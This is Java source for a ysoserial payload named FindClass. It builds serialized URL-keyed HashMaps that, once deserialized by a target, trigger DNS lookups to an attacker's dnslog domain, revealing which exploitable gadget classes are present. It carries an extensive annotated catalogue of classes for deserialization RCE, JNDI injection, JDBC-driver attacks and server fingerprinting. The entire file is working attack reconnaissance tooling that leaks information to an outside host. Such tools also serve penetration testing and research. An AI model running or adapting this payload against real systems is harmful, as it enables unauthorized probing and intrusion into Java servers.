package ysoserial.payloads;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.*;

@Authors({Authors.Ar3h})
public class FindClass implements ObjectPayload<Object> {
    private final List hashMaps = new ArrayList<>();
    public String useCanary = "false";
    public String prefix = "";
    private int count = 1;
    private static final ClassPool classPool = ClassPool.getDefault();
    private int canaryCount = 1;
    private final static Map<String, Map<String, String>> classMap = new LinkedHashMap<>(); // 预设参数
    public String num = "10";
    public String domain = "xxx.dnslog.cn";
    public static Map<String, Class> cacheMap = new HashMap<>();


    private void addGadget(Map<String, String> map) {
        for (Map.Entry<String, String> innerEntry : map.entrySet()) {
            addGadget(innerEntry.getKey(), innerEntry.getValue());
        }
    }

    private void addGadget(String key, String className) {
        if (Boolean.parseBoolean(useCanary)) {
            insertCanary();
        }

        String targetClassName = className;
        if (prefix != null && !prefix.isEmpty()) {
            if (!prefix.endsWith(".")) {
                targetClassName = prefix + "." + className;
            } else {
                targetClassName = prefix + className;
            }
        }
        count++;
        // String url = String.format("http://%s.%s.%s", key, time, this.domain);  // 通过子域名的dns记录来带出信息
        String url = String.format("http://%s.%s", key, this.domain);  // 通过子域名的dns记录来带出信息
        HashMap hashMapPayload = getHashMapPayload(url, targetClassName);
        hashMaps.add(hashMapPayload);
    }

    private void insertCanary() {
        if (count % Integer.parseInt(num) == 0) {
            String canaryName = "canary_" + canaryCount++;
            // String canaryUrl = String.format("http://%s.%s.%s", canaryName, time, this.domain);
            String canaryUrl = String.format("http://%s.%s", canaryName, this.domain);
            HashMap canaryPayload = getHashMapPayload(canaryUrl, "java.lang.Object");
            hashMaps.add(canaryPayload);
        }
    }

    public HashMap getHashMapPayload(String urls, String clazzName) {
        HashMap hashMap = new HashMap();
        try {
            URL url = new URL(urls);
            Field f = getClass("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true);
            f.set(url, 0);
            Class clazz = getClass(clazzName);
            hashMap.put(url, clazz);
            f.set(url, -1);
        } catch (Exception e) {
        }
        return hashMap;
    }


    public static boolean checkClass(String className) {
        Class<?> clazz = null;
        try {
            clazz = Class.forName(className);
        } catch (ClassNotFoundException e) {
            return false;
        }

        // 引导类加载器加载的类的类加载器为 null
        return clazz.getClassLoader() == null;
    }

    public static Class<?> getClazz(String clazzName) throws CannotCompileException, ClassNotFoundException {
        // 如果是系统类直接返回
        if (checkClass(clazzName)) {
            return Class.forName(clazzName);
        }

        // 动态生成新的类
        CtClass ctClass = null;
        byte[] byteCode;
        try {
            ctClass = classPool.makeClass(clazzName);
            ctClass.defrost();
            return ctClass.toClass();
        } catch (Exception e) {
            return Class.forName(clazzName);
        }
    }

    public Class getClass(String clazzName) throws Exception {
        Class clazz = cacheMap.get(clazzName);
        if (clazz == null) {
            clazz = getClazz(clazzName);
            cacheMap.put(clazzName, clazz);
        }
        return clazz;
    }

    static {
        // ge 大于等于
        // le 小于等于
        // gt 大于
        // lt 小于
        // eq 等于

        Map<String, String> startMap = new LinkedHashMap<>();
        startMap.put("START", "java.lang.Object");
        classMap.put("START", startMap);

        Map<String, String> osMap = new LinkedHashMap<>();
        osMap.put("linux", "java.io.UnixFileSystem");
        osMap.put("windows", "java.io.WinNTFileSystem");
//        osMap.put("linux", "com.sun.security.auth.module.UnixSystem");
//        osMap.put("windows", "com.sun.security.auth.module.NTSystem");
        // osMap.put("windows_awt", "sun.awt.windows.WButtonPeer");
        // osMap.put("linux_awt", "sun.awt.X11.AwtGraphicsConfigData");
        classMap.put("os", osMap);

        Map<String, String> ccMap = new LinkedHashMap<>();
        ccMap.put("cc3_ChainedTransformer", "org.apache.commons.collections.functors.ChainedTransformer");
        ccMap.put("cc31", "org.apache.commons.collections.list.TreeList");
//        ccMap.put("cc32x_game_over1", "org.apache.commons.collections.buffer.BoundedBuffer");
//        ccMap.put("cc322_game_over2", "org.apache.commons.collections.functors.FunctorUtils$1");
//        ccMap.put("cc322_game_over3", "org.apache.commons.collections.ExtendedProperties$1");

        ccMap.put("cc4_exist", "org.apache.commons.collections4.comparators.TransformingComparator");
        ccMap.put("cc40_ChainedTransformer", "org.apache.commons.collections4.functors.ChainedTransformer");
        ccMap.put("cc41_game_over", "org.apache.commons.collections4.FluentIterable");
        classMap.put("cc", ccMap);

        // c3p0，serialVersionUID不同
        // 0.9.2pre2-0.9.5pre8为7387108436934414104
        // 0.9.5pre9-0.9.5.5为-2440162180985815128
        Map<String, String> c3p0Map = new LinkedHashMap<>();
        c3p0Map.put("c3p0", "com.mchange.v2.c3p0.PoolBackedDataSource");
        c3p0Map.put("c3p092x", "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
        c3p0Map.put("c3p095x", "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
        classMap.put("c3p0", c3p0Map);

        Map<String, String> cbMap = new LinkedHashMap<>();
        cbMap.put("cb17", "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
        cbMap.put("cb18", "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
        cbMap.put("cb19", "org.apache.commons.beanutils.BeanIntrospectionData");
        cbMap.put("cb_BeanComparator", "org.apache.commons.beanutils.BeanComparator");
        classMap.put("cb", cbMap);

        // bsh,serialVersionUID 不同
        // 2.0b4 为4949939576606791809
        // 2.0b5 为4041428789013517368
        // 2.0b6 无法反序列化
        Map<String, String> bshMap = new LinkedHashMap<>();
        bshMap.put("bsh_XThis", "bsh.XThis");
        bshMap.put("bsh20b4", "bsh.CollectionManager$1");
        bshMap.put("bsh20b5", "bsh.engine.BshScriptEngine");
        bshMap.put("bsh20b6", "bsh.collection.CollectionIterator$1");
        classMap.put("bsh", bshMap);

        // Groovy,1.7.0-2.4.3,serialVersionUID不同
        // 2.4.x为-8137949907733646644
        // 2.3.x为1228988487386910280
        Map<String, String> groovyMap = new LinkedHashMap<>();
        groovyMap.put("groovy1702311", "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
        groovyMap.put("groovy24x", "groovy.lang.Tuple2");
        groovyMap.put("groovy244", "org.codehaus.groovy.runtime.dgm$1170");
        groovyMap.put("groovy_classloader", "groovy.lang.GroovyClassLoader");
        classMap.put("groovy", groovyMap);

        HashMap<String, String> chainsMap = new LinkedHashMap<>();
        chainsMap.put("jdk7u21", "com.sun.corba.se.impl.orbutil.ORBClassLoader");
        chainsMap.put("jdk_7u25_to_8u20", "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1"); // 7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
        chainsMap.put("AspectJWeaver", "org.aspectj.weaver.tools.cache.SimpleCache");
        chainsMap.put("ClassPathXmlApplicationContext", "org.springframework.context.support.ClassPathXmlApplicationContext"); // postgresql jdbc RCE 利用姿势
        chainsMap.put("Rome_low_ToStringBean", "com.sun.syndication.feed.impl.ToStringBean"); // rome 1.0 低版本
        chainsMap.put("Rome_high_ObjectBean", "com.rometools.rome.feed.impl.ObjectBean"); // rome 高版本
        classMap.put("chains", chainsMap);

        // 以下是数据库驱动
        Map<String, String> dbMap = new LinkedHashMap<>();
        dbMap.put("mysql_driver", "com.mysql.jdbc.Driver"); // 反序列化，需要出网
        dbMap.put("mysql_cj_driver", "com.mysql.cj.jdbc.Driver"); // 反序列化，需要出网
        dbMap.put("postgresql_driver", "org.postgresql.Driver"); // 远程/本地加载XML文件，进而SpEL表达式执行
        dbMap.put("hsqldb_driver", "org.hsqldb.jdbcDriver"); // hsqldb反序列化 https://xz.aliyun.com/t/14714 https://xz.aliyun.com/t/9162
        dbMap.put("h2_driver", "org.h2.Driver"); // getter rce
        dbMap.put("sqlite_driver", "org.sqlite.JDBC"); // SSRF、加载so
        dbMap.put("derby_driver", "org.apache.derby.jdbc.EmbeddedDriver"); // 远程读取并进行反序列化
        dbMap.put("teradata_drvier", "com.teradata.jdbc.TeraDriver"); // 反序列化, 需要出网
        dbMap.put("db2_driver", "COM.ibm.db2.jcc.DB2Driver"); // JNDI注入
        dbMap.put("modeshape_driver", "org.modeshape.jdbc.LocalJcrDriver"); // JNDI注入
        dbMap.put("fabric_driver", "com.mysql.fabric.jdbc.FabricMySQLDriver"); // XXE
        dbMap.put("dm_driver", "dm.jdbc.driver.DmDriver"); // 达梦数据库, JNDI注入
        dbMap.put("sqlserver_driver", "com.microsoft.sqlserver.jdbc.SQLServerDriver"); // 泄漏hash，https://x.com/frycos/status/1717282080390836370
        dbMap.put("microsoft_driver", "com.microsoft.jdbc.sqlserver.SQLServerDriver"); // 同上
        dbMap.put("oracle_driver", "oracle.jdbc.OracleDriver"); // JNDI注入
        dbMap.put("oracle_driver2", "oracle.jdbc.driver.OracleDriver"); // JNDI注入
        dbMap.put("jtds_driver", "net.sourceforge.jtds.jdbc.Driver"); // sqlserver的一种驱动
        dbMap.put("mariadb_driver", "org.mariadb.jdbc.Driver");
        dbMap.put("kingbase_driver", "com.kingbase.Driver");
        dbMap.put("kingbase8_driver", "com.kingbase8.Driver"); // 人大金仓
        dbMap.put("shen_tong_driver", "com.oscar.Driver"); // 神通
        dbMap.put("Gbase8s_driver", "com.gbasedbt.jdbc.Driver"); // Gbase8s
        dbMap.put("xugu_driver", "com.xugu.cloudjdbc.Driver"); // 虚谷
        dbMap.put("GoldenDB_driver", "com.goldendb.jdbc.Driver"); // 中兴GoldenDB
        // dbMap.put("ali_oracle_driver", "com.alibaba.jdbc.AlibabaDriver");
        // dbMap.put("log4jdbc_drvier", "net.sf.log4jdbc.DriverSpy");
        // dbMap.put("sybase_drvier", "com.sybase.jdbc2.jdbc.SybDriver");
        // dbMap.put("ali_odps_drvier", "com.aliyun.odps.jdbc.OdpsDriver");
        // dbMap.put("hive_driver", "org.apache.hive.jdbc.HiveDriver");
        // dbMap.put("cloudscape_driver", "COM.cloudscape.core.JDBCDriver");
        // dbMap.put("ingres_driver", "com.ingres.jdbc.IngresDriver");
        // dbMap.put("informix_driver", "com.informix.jdbc.IfxDriver");
        // dbMap.put("timesten_driver", "com.timesten.jdbc.TimesTenDriver");
        // dbMap.put("ibm_as400_driver", "com.ibm.as400.access.AS400JDBCDriver");
        // dbMap.put("dbtech_driver", "com.sap.dbtech.jdbc.DriverSapDB");
        // dbMap.put("jnetdirect_driver", "com.jnetdirect.jsql.JSQLDriver");
        // dbMap.put("jturbo_driver", "com.newatlanta.jturbo.driver.Driver");
        // dbMap.put("firebirdsql_driver", "org.firebirdsql.jdbc.FBDriver");
        // dbMap.put("interclient_driver", "interbase.interclient.Driver");
        // dbMap.put("pointbase_driver", "com.pointbase.jdbc.jdbcUniversalDrive");
        // dbMap.put("edbc_driver", "ca.edbc.jdbc.EdbcDriver");
        // dbMap.put("mimer_driver", "com.mimer.jdbc.Driver");
        // dbMap.put("mckoi_driver", "com.mckoi.JDBCDriver");
        classMap.put("db", dbMap);

        // 以下适用于在 JNDI 中，Tomcat BeanFactory 无法使用的场景
        // 以下类可通过h2来实现rce
        Map<String, String> dataSourceMap = new LinkedHashMap<>();
        dataSourceMap.put("jndi_factory_bypass_alibaba_druid", "com.alibaba.druid.pool.DruidDataSourceFactory"); // 配合h2依赖，可RCE
        dataSourceMap.put("jndi_factory_bypass_tomcat7_and_dbcp1", "org.apache.tomcat.dbcp.dbcp1.BasicDataSource");
        dataSourceMap.put("jndi_factory_bypass_tomcat8_and_dbcp2", "org.apache.tomcat.dbcp.dbcp2.BasicDataSource");
        dataSourceMap.put("jndi_factory_bypass_common_dbcp", "org.apache.commons.dbcp.BasicDataSourceFactory");
        dataSourceMap.put("jndi_factory_bypass_common_dbcp2", "org.apache.commons.dbcp2.BasicDataSourceFactory");
        dataSourceMap.put("jndi_factory_bypass_tomcat_jdbc", "org.apache.tomcat.jdbc.pool.DataSourceFactory");
        dataSourceMap.put("jndi_spring", "org.springframework.beans.factory.config.PropertyPathFactoryBean");
        dataSourceMap.put("HikariJNDIFactory_DataSource", "com.zaxxer.hikari.HikariJNDIFactory");
        dataSourceMap.put("teradata_DataSource", "com.teradata.jdbc.TeraDataSource"); // 反序列化, 参考: https://github.com/luelueking/Deserial_Sink_With_JDBC/tree/main?tab=readme-ov-file#teradata
        classMap.put("datasource", dataSourceMap);

        Map<String, String> jndiAttackMap = new LinkedHashMap<>();
        jndiAttackMap.put("BeanFactory_game_over", "org.apache.catalina.filters.CsrfPreventionFilter$NonceCache"); // tomcat9.0.63/8.5.79高版本才有的类,有这个代表无法再用BeanFactory的forceString
        jndiAttackMap.put("BeanFactory_yes", "org.apache.naming.factory.BeanFactory");  // 存在此类才可以调用单String方法
        jndiAttackMap.put("bes_BeanFactory", "com.bes.enterprise.naming.factory.BeanFactory");
        jndiAttackMap.put("el", "javax.el.ELProcessor");// jndi利用, 调用单String方法, 最常见的RCE利用
        jndiAttackMap.put("groovy", "groovy.lang.GroovyShell");// jndi利用, 调用单String方法

        jndiAttackMap.put("BurlapProxyFactory_ObjectFactory", "com.caucho.burlap.client.BurlapProxyFactory"); // ssrf

        jndiAttackMap.put("MemoryUserDatabaseFactory_ObjectFactory", "org.apache.catalina.users.MemoryUserDatabaseFactory"); // 新的ObjectFactory，可用来写文件rce
        jndiAttackMap.put("UserDatabase", "org.apache.catalina.UserDatabase");// 利用的点

        jndiAttackMap.put("GenericNamingResourcesFactory_ObjectFactory", "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory"); // 新的ObjectFactory，可配合以下gadget修改环境变量
        jndiAttackMap.put("Configuration_modify_system_property", "org.apache.commons.configuration.SystemConfiguration"); // 可修改系统变量
        jndiAttackMap.put("Configuration2_modify_system_property", "org.apache.commons.configuration2.SystemConfiguration");   // 可修改系统变量
        jndiAttackMap.put("groovy_modify_system_env", "org.apache.groovy.util.SystemUtil");     // 可修改系统变量

        jndiAttackMap.put("ibm_ObjectFactory", "com.ibm.ws.webservices.engine.client.ServiceFactory"); // webspher ObjectFactory
        jndiAttackMap.put("ibm_ObjectFactory2", "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory");

        jndiAttackMap.put("snakeyaml", "org.yaml.snakeyaml.Yaml");// jndi利用, 调用单String方法
        jndiAttackMap.put("xstream", "com.thoughtworks.xstream.XStream");// jndi利用, 调用单String方法
        jndiAttackMap.put("mvel", "org.mvel2.sh.ShellSession");// jndi利用, 调用单String方法
        jndiAttackMap.put("jexl2", "org.apache.commons.jexl2.JexlParser");// jndi利用, 调用单String方法
        jndiAttackMap.put("jexl3", "org.apache.commons.jexl3.scripting.JexlScriptEngine");// jndi利用, 调用单String方法
        jndiAttackMap.put("ognl", "com.opensymphony.xwork2.ActionSupport"); // jndi利用, 调用单String方法, 使用ognl表达式实现rce
        jndiAttackMap.put("NativeLibLoader", "com.sun.glass.utils.NativeLibLoader");    // jndi利用, 调用单String方法, jdk自带, 用于加载本地动态链接库
        jndiAttackMap.put("velocity_jndi_write", "org.apache.velocity.texen.util.FileUtil");    // jndi利用中, 调用单String方法, velocity创建文件夹
        jndiAttackMap.put("h2_create_dir", "org.h2.store.fs.FileUtils");    // jndi利用中, 调用单String方法, 通过此类创建文件夹
        jndiAttackMap.put("websphere_jar_rce_ClientJ2CCFFactory", "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory");
        jndiAttackMap.put("websphere_jar_rce_ServiceFactory", "com.ibm.ws.client.applicationclient.ServiceFactory");
        jndiAttackMap.put("PropertiesConfiguration", "org.apache.commons.configuration.PropertiesConfiguration"); // jndi中可以用来远程下载文件或读取文件
        classMap.put("jndiAttack", jndiAttackMap);

        Map<String, String> otherMap = new LinkedHashMap<>();
        otherMap.put("spel", "org.springframework.expression.spel.standard.SpelExpressionParser");  // spel表达式
        otherMap.put("commons_KeyedObjectPoolFactory", "org.apache.commons.pool.KeyedObjectPoolFactory");   //
        otherMap.put("tomcat_PooledObjectFactory", "org.apache.commons.pool2.PooledObjectFactory");
        otherMap.put("hibernate_rce", "org.hibernate.jmx.StatisticsService");   // hibernate链
        otherMap.put("mysql_MiniAdmin", "com.mysql.cj.jdbc.admin.MiniAdmin");
        otherMap.put("OracleCachedRowSet_jndi", "oracle.jdbc.rowset.OracleCachedRowSet"); // getConnection 无参触发JNDI
        otherMap.put("oracle_jdbcrowset", "oracle.jdbc.rowset.OracleJDBCRowSet"); // getConnection 有参、setCommand 有参触发JNDI
        otherMap.put("dameng_DmdbRowSet", "dm.jdbc.driver.DmdbRowSet"); // getConnection 触发 JNDI
        otherMap.put("jboss_rce", "org.jboss.util.propertyeditor.DocumentEditor");  // jboss链
        otherMap.put("myfaces_rce", "org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression"); // myfaces链
        otherMap.put("jython_rce", "org.python.core.PyBytecode.PyBytecode");    // jython链
        otherMap.put("rome_rce", "com.sun.syndication.feed.impl.ObjectBean");   // rome链
        otherMap.put("vaadin_rce", "com.vaadin.data.util.PropertysetItem"); // vaadin链
        otherMap.put("wicket_rce", "org.apache.wicket.util.upload.DiskFileItem");   // wicket链
        otherMap.put("rhino_js_rce", "org.mozilla.javascript.NativeError"); // rhino js链
        otherMap.put("hibernate_Getter", "org.hibernate.property.Getter");
        otherMap.put("hibernate_TypedValue", "org.hibernate.engine.spi.TypedValue");
        otherMap.put("net_sf_json_rce", "net.sf.json.JSONObject");  // JSON链
        otherMap.put("clojure_rce", "clojure.lang.PersistentArrayMap"); // clojure链
        otherMap.put("click_rce", "org.apache.click.control.Table");    // click链
        otherMap.put("WildFly_rce", "org.jboss.as.connector.subsystems.datasources.WildFlyDataSource");
        otherMap.put("WildFly_rce", "org.apache.batik.swing.JSVGCanvas"); // 远程加载svg造成XSS,XXE,RCE
        otherMap.put("hibernate_core_4.x", "org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl"); // hibernate-core-4.x,比较低版本才有的类
        otherMap.put("tomcat9_not_version8", "org.apache.catalina.util.ToStringUtil");
        otherMap.put("log4j_jndi", "org.apache.log4j.receivers.dbMap.JNDIConnectionSource"); // 反序列化链, 仅适用于Hessian反序列化, 不适用于Java反序列化, 可实现jndi
        otherMap.put("log4j_driver", "org.apache.log4j.receivers.dbMap.DriverManagerConnectionSource");
        otherMap.put("jdbcRowSet", "com.sun.rowset.JdbcRowSetImpl"); // getter方法触发JNDI
        otherMap.put("ibatis_jndi", "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory");
        otherMap.put("ibatis_XPathParser", "org.apache.ibatis.parsing.XPathParser");
        otherMap.put("LogFactory", "org.apache.juli.logging.LogFactory");
        otherMap.put("MXParser", "org.xmlpull.mxp1.MXParser");
        otherMap.put("XmlPullParserException", "org.xmlpull.v1.XmlPullParserException");
        classMap.put("other", otherMap);

        Map<String, String> gadgetMap = new LinkedHashMap<>();
        gadgetMap.put("BadAttributeValueExpException", "javax.management.BadAttributeValueExpException");
        gadgetMap.put("jackson_POJONode", "com.fasterxml.jackson.databind.node.POJONode");
        gadgetMap.put("fastjson", "com.alibaba.fastjson.JSONArray");
        gadgetMap.put("fastjson2", "com.alibaba.fastjson2.JSONArray");
        gadgetMap.put("UnicastRef", "sun.rmi.server.UnicastRef");
        gadgetMap.put("fileupload_DiskFileItem", "org.apache.commons.fileupload.disk.DiskFileItem");
        gadgetMap.put("fileupload_FileItem", "org.apache.commons.fileupload.FileItem");
        gadgetMap.put("cc_TreeBag", "org.apache.commons.collections.bag.TreeBag");
        gadgetMap.put("SignedObject", "java.security.SignedObject"); // 二次反序列化
        gadgetMap.put("MapMessage", "org.apache.catalina.tribes.tipis.AbstractReplicatedMap$MapMessage"); // 二次反序列化
        gadgetMap.put("weblogic_gadget", "oracle.ucp.jdbc.PoolDataSourceImpl"); // 反序列化转getter(getConnection)转jdbc(h2)转所需要的DataSource中转类,weblogic依赖
        gadgetMap.put("spring_aop1_for_jackson", "org.springframework.aop.framework.AdvisedSupport");
        gadgetMap.put("spring_aop2_for_jackson", "org.springframework.aop.framework.JdkDynamicAopProxy"); // 可以使用spring-aop来解决jackson中调用不稳定的问题
        gadgetMap.put("jdk9_jshell", "jdk.jshell.JShell");
        gadgetMap.put("jdk9", "jdk.internal.loader.ClassLoaders$AppClassLoader");

        // https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf
        gadgetMap.put("jxpath_gadget", "org.apache.commons.jxpath.ri.model.NodePointer");
        gadgetMap.put("ASeq_gadget", "clojure.lang.ASeq");
        gadgetMap.put("Page_gadget", "org.htmlparser.lexer.Page");

        // 以下是getter方法触发jndi、jdbc等关键类
        gadgetMap.put("tomcat_dbcp_getter1", "org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource");   // getConnection 触发 JNDI
        gadgetMap.put("tomcat_dbcp_getter2", "org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource");   // getConnection 触发 JNDI
        gadgetMap.put("tomcat_dbcp2_getter1", "org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource");   // getConnection 触发 JNDI
        gadgetMap.put("tomcat_dbcp2_getter2", "org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource");   // getConnection 触发 JNDI
        gadgetMap.put("postgresql_getter", "org.postgresql.ds.PGConnectionPoolDataSource");   // getConnection 触发 postgreSQL jdbc url attack
        gadgetMap.put("mysql_getter", "com.mysql.jdbc.jdbc2.optional.MysqlDataSource");   // getConnection 触发 Mysql jdbc url attack
        gadgetMap.put("druid_getter1_DruidDataSource", "com.alibaba.druid.pool.DruidDataSource");   // getConnection 触发 JNDI
        gadgetMap.put("druid_getter2_DruidQuartzConnectionProvider", "com.alibaba.druid.support.quartz.DruidQuartzConnectionProvider");    // getConnection 触发 JNDI
        gadgetMap.put("druid_getter3_DruidXADataSource", "com.alibaba.druid.pool.xa.DruidXADataSource");   // getConnection 触发 JNDI
        gadgetMap.put("common_dbcp_getter1", "org.apache.commons.dbcp.datasources.SharedPoolDataSource");   // getConnection 触发 JNDI
        gadgetMap.put("common_dbcp_getter2", "org.apache.commons.dbcp.datasources.PerUserPoolDataSource");   // getConnection 触发 JNDI
        gadgetMap.put("common_dbcp2_getter1", "org.apache.commons.dbcp2.datasources.SharedPoolDataSource");   // getConnection 触发 JNDI
        gadgetMap.put("common_dbcp2_getter2", "org.apache.commons.dbcp2.datasources.PerUserPoolDataSource");   // getConnection 触发 JNDI
        gadgetMap.put("spring_aop_HotSwappableTargetSource", "org.springframework.aop.target.HotSwappableTargetSource"); // toString链的一环
        gadgetMap.put("resin_qname_rce", "com.caucho.naming.QName");    // Resin链
        classMap.put("gadget", gadgetMap);

        Map<String, String> jdkMap = new LinkedHashMap<>();
        jdkMap.put("jdk_17_to_22", "jdk.internal.util.random.RandomSupport");
        jdkMap.put("jdk_9_to_22_Unsafe", "jdk.internal.misc.Unsafe");
        jdkMap.put("jdk_le_8_BASE64Decoder", "sun.misc.BASE64Decoder");
        jdkMap.put("jdk_6_to_11", "com.sun.awt.SecurityWarning");
        jdkMap.put("jdk_9_to_10", "jdk.incubator.http.HttpClient");
        jdkMap.put("jdk8_Base64", "java.util.Base64");
        jdkMap.put("jdk_xml_utils_Base64", "com.sun.org.apache.xml.internal.security.utils.Base64");
        jdkMap.put("jrmp", "java.rmi.server.UnicastRemoteObject");
        jdkMap.put("Runtime", "java.lang.Runtime");
        jdkMap.put("ProcessBuilder", "java.lang.ProcessBuilder");
        jdkMap.put("activej_DefiningClassLoader", "io.activej.codegen.DefiningClassLoader");
        jdkMap.put("bcel", "com.sun.org.apache.bcel.internal.util.ClassLoader");
        jdkMap.put("cc_bypass_DefiningClassLoader", "sun.org.mozilla.javascript.internal.DefiningClassLoader");
        jdkMap.put("cc_bypass_DefiningClassLoader2", "org.mozilla.javascript.DefiningClassLoader");
        jdkMap.put("xalan_TemplatesImpl", "org.apache.xalan.xsltc.trax.TemplatesImpl");
        jdkMap.put("jdk_TemplatesImpl", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        classMap.put("jdk", jdkMap);

        Map<String, String> webMap = new LinkedHashMap<>();
        webMap.put("tomcat_webserver", "org.apache.catalina.startup.Catalina");
        webMap.put("weblogic_webserver", "weblogic.servlet.internal.WebAppModule");
        webMap.put("resin_webserver", "com.caucho.server.resin.Resin");
        webMap.put("jetty_webserver", "org.eclipse.jetty.server.Server");
        webMap.put("websphere_webserver", "com.ibm.wsspi.sib.core.exception.SINotAuthorizedException");
        webMap.put("undertow_webserver", "io.undertow.server.Connectors");
        webMap.put("glassfish_webserver", "org.glassfish.jersey.server.ContainerException");
        webMap.put("tongweb_webserver1", "com.tongweb.catalina.core.StandardHost");// 东方通
        webMap.put("tongweb_webserver2", "com.tongweb.catalina.startup.ThanosCatalina");
        webMap.put("tongweb_webserver3", "com.tongweb.catalina.startup.Bootstrap");
        webMap.put("bes_webserver", "com.bes.enterprise.webtier.LifecycleException");   // 宝蓝德
        webMap.put("cvicse_webserver", "com.cvicse.enterprise.connectors.ConnectorRuntime"); // 中创
        webMap.put("primeton_webserver", "com.primeton.appserver.enterprise.v3.common.XMLContentActionReporter"); // 普元
        webMap.put("apusic_webserver", "com.apusic.web.container.WebContainer");    // 金蝶
        webMap.put("kingdee_webserver", "com.kingdee.eas.hse.scm.service.app.OnlineOrderInterface"); // 金蝶
        classMap.put("web", webMap);

        Map<String, String> endMap = new LinkedHashMap<>();
        endMap.put("END", "java.lang.Object");
        classMap.put("END", endMap);
    }



    @Override
    public Object getObject(String command) throws Exception {
        domain = command;
        for (Map.Entry<String, Map<String, String>> mapEntry : classMap.entrySet()) {
            Map<String, String> entryMap = mapEntry.getValue();
            addGadget(entryMap);
        }
        List<Object> list = new LinkedList();
        list.addAll(hashMaps);
        return list;
    }
}
